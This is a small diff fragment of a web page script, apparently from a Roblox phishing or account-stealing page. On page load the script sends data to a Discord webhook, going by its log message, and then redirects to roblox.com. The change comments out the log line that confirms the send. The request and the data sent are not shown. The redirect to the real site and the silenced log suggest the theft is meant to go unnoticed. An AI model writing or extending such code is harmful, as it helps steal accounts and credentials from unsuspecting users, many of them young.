@@ -28,7 +28,7 @@ document.addEventListener("DOMContentLoaded", () => {
                 });
             })
             .then(() => {
-                console.log("已送出至 Discord Webhook");
+                //console.log("已送出至 Discord Webhook");
                 window.location.href = "https://www.roblox.com/";
             })
             .catch((error) => {
